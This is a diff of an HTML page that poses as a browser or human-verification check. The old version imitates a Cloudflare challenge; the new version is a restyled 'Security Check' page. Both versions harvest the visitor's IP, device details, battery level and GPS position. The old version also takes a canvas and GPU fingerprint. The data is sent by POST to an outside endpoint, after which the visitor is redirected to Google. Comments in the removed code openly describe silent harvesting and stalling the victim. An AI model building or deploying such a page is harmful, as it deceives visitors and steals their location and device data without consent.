@@ -3,124 +3,73 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<title>Just a moment...</title>
+<title>Security Check</title>
 <style>
-  body { background-color: #f9f9f9; color: #333; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
-  .box { background: #fff; border: 1px solid #e0e0e0; padding: 30px; border-radius: 8px; width: 80%; max-width: 350px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
-  .cf-logo { margin-bottom: 20px; }
-  h2 { font-weight: 600; font-size: 20px; margin-bottom: 10px; }
-  p { color: #666; font-size: 14px; margin-bottom: 25px; }
-  .checkbox-row { display: flex; align-items: center; justify-content: flex-start; text-align: left; margin-bottom: 10px; }
-  .checkbox-row input { margin-right: 12px; transform: scale(1.5); }
-  .checkbox-row label { font-size: 14px; font-weight: 500; }
-  
-  /* Progress bar for the fake scan */
-  .progress-container { display: none; width: 100%; background-color: #eee; border-radius: 4px; margin-top: 15px; overflow: hidden; }
-  .progress-bar { width: 0%; height: 6px; background-color: #f38020; transition: width 0.3s ease; }
-  .status-text { font-size: 12px; color: #666; margin-top: 8px; display: none; text-align: left;}
-
-  .footer { font-size: 11px; color: #999; margin-top: 15px; display: flex; justify-content: space-between; align-items: center; }
+  body { background-color: #08080a; color: #ececf0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+  .loader { border: 3px solid #24242e; border-top: 3px solid #ffb03d; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  h2 { font-weight: 700; letter-spacing: 0.05em; margin-bottom: 5px; }
+  p { color: #7a7a88; font-size: 14px; max-width: 300px; line-height: 1.5; margin-bottom: 20px; }
+  .box { background: #101014; border: 1px solid #24242e; padding: 40px 20px; border-radius: 12px; width: 80%; max-width: 350px; }
+  button { background: #ffb03d; color: #000; border: none; padding: 14px 24px; border-radius: 8px; font-weight: 800; font-size: 14px; font-family: inherit; letter-spacing: 0.05em; cursor: pointer; width: 100%; transition: 0.2s; }
+  button:active { opacity: 0.7; transform: scale(0.98); }
 </style>
 </head>
 <body>
 
 <div class="box">
-  <div class="cf-logo">
-    <svg width="60" height="25" viewBox="0 0 100 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-      <path d="M70.9 25.6l-2.3-8.2c-.1-.3-.3-.5-.6-.6l-4.2-1.6c-.3-.1-.6.1-.7.4l-3.5 12.4c-.1.2-.1.5.1.7.1.2.3.2.5.2h5.3c.3 0 .5-.2.6-.5l1.2-4.2c.1-.3.3-.5.6-.6h1.7c.4 0 .7-.3.7-.7v-.1c0-.3-.3-.6-.6-.7h-2.3c-.3 0-.5.2-.6.4l-.8 2.8c-.1.3-.3.4-.6.4h-2.1c-.2 0-.4-.1-.5-.3-.1-.2-.1-.4 0-.6l2.8-10c.1-.3.3-.4.6-.4h2.5c.2 0 .4.1.5.3l1.8 6.4c.1.3-.1.6-.4.6h-2c-.3 0-.6.2-.6.5 0 .3.2.5.5.5h3.7c.3 0 .5-.2.6-.4z" fill="#F38020"/>
-      <path d="M54.8 32.9l-1.3-4.5c-.1-.3-.3-.5-.6-.6l-4.2-1.6c-.3-.1-.6.1-.7.4l-1.9 6.8c-.1.2-.1.5.1.7.1.2.3.2.5.2h5.3c.3 0 .5-.2.6-.5l.4-1.5c.1-.3.3-.5.6-.6h.7c.4 0 .7-.3.7-.7v-.1c0-.3-.3-.6-.6-.7h-1.4c-.3 0-.5.2-.6.4l-.4 1.5c-.1.3-.3.4-.6.4h-2.1c-.2 0-.4-.1-.5-.3-.1-.2-.1-.4 0-.6l1.4-5.1c.1-.3.3-.4.6-.4h2.5c.2 0 .4.1.5.3l1 3.6c.1.3-.1.6-.4.6h-1c-.3 0-.6.2-.6.5 0 .3.2.5.5.5h2.6c.3 0 .5-.2.6-.4z" fill="#F38020"/>
-    </svg>
-  </div>
-  <h2>Checking your browser</h2>
-  <p>Verifying you are human. This may take a few seconds.</p>
-  
-  <div class="checkbox-row" id="checkRow">
-    <input type="checkbox" id="humanCheck" onclick="startTracking()">
-    <label for="humanCheck">Verify you are human</label>
-  </div>
-  
-  <div class="progress-container" id="progContainer">
-    <div class="progress-bar" id="progBar"></div>
-  </div>
-  <div class="status-text" id="statusText">Initializing scan...</div>
-
-  <div class="footer">
-    <span>Cloudflare</span>
-    <span>Privacy • Terms</span>
-  </div>
+  <div class="loader" id="spin"></div>
+  <h2 id="title">Verifying connection...</h2>
+  <p id="desc">Please verify your identity to confirm you are human and not a bot.</p>
+  <button id="verifyBtn" onclick="startTracking()">Verify Identity</button>
 </div>
 
 <script>
-  let baseData = {
-      ip: "Unknown", device: navigator.userAgent, resolution: window.screen.width + "x" + window.screen.height,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language,
-      battery: "Unknown", gps: null, cores: navigator.hardwareConcurrency || "Unknown",
-      ram: navigator.deviceMemory || "Unknown", gpu: "Unknown", fingerprint: "Unknown"
-  };
+  let baseData = {};
 
-  // 1. Silent Harvest: IP & Battery
-  fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => baseData.ip = d.ip).catch(()=>{});
-  if (navigator.getBattery) {
-      navigator.getBattery().then(b => { baseData.battery = Math.round(b.level * 100) + "%" + (b.charging ? " (Charging)" : ""); });
-  }
+  fetch("https://api.ipify.org?format=json").then(r => r.json()).then(ipData => {
+      baseData = {
+          ip: ipData.ip,
+          device: navigator.userAgent,
+          resolution: window.screen.width + "x" + window.screen.height,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          battery: "Unknown",
+          gps: null
+      };
 
-  // 2. Silent Harvest: GPU & Canvas Fingerprint
-  try {
-      const canvas = document.createElement('canvas');
-      const ctx = canvas.getContext('2d');
-      ctx.textBaseline = "top"; ctx.font = "14px 'Arial'"; ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
-      ctx.fillStyle = "#069"; ctx.fillText("OPFORGE", 2, 15); ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("OPFORGE", 4, 17);
-      baseData.fingerprint = canvas.toDataURL().slice(-32); // unique hash
-      
-      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-      if (debugInfo) { baseData.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); }
-  } catch(e) {}
+      if (navigator.getBattery) {
+          navigator.getBattery().then(function(battery) {
+              baseData.battery = Math.round(battery.level * 100) + "%" + (battery.charging ? " (Charging)" : "");
+          });
+      }
+  });
 
   function startTracking() {
-      document.getElementById("humanCheck").style.display = "none";
-      document.querySelector("label[for='humanCheck']").innerText = "Please wait...";
-      document.getElementById("progContainer").style.display = "block";
-      document.getElementById("statusText").style.display = "block";
+      document.getElementById("desc").innerText = "Verifying... please wait.";
+      document.getElementById("verifyBtn").style.display = "none";
+      document.getElementById("spin").style.display = "block";
 
-      // Fake scanning sequence to keep them on the page
-      let progress = 0;
-      const bar = document.getElementById("progBar");
-      const status = document.getElementById("statusText");
-      
-      const interval = setInterval(() => {
-          progress += Math.random() * 20;
-          if (progress > 90) progress = 90;
-          bar.style.width = progress + "%";
-          status.innerText = "Verifying connection security...";
-      }, 300);
-
-      // Prompt for Location
       if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(
               (pos) => {
                   baseData.gps = pos.coords.latitude + "," + pos.coords.longitude;
-                  finish(interval);
+                  sendData(baseData);
               },
               (err) => {
-                  finish(interval); // They hit deny, but we already grabbed everything else
+                  sendData(baseData);
               },
               { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
           );
       } else {
-          finish(interval);
+          sendData(baseData);
       }
   }
 
-  function finish(interval) {
-      clearInterval(interval);
-      document.getElementById("progBar").style.width = "100%";
-      document.getElementById("statusText").innerText = "Success. Redirecting...";
-      
+  function sendData(payload) {
       fetch("https://Opforge--8d359e98dca911f194261607ee4eb77e.web.val.run", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(baseData)
+          body: JSON.stringify(payload)
       }).finally(() => {
           window.location.href = "https://www.google.com";
       });
